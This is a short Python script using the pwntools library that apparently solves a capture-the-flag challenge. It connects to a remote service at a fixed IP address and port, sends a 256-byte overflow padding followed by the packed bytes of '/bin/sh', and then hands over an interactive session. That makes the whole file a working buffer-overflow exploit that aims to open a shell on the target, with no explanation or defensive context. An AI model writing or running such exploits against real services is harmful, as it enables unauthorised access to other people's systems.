from pwn import *

proc = remote("109.233.56.90", 11577)
proc.send(b"a"*256 + p32(0x6e69622f) + p32(0x0068732f))
proc.interactive()
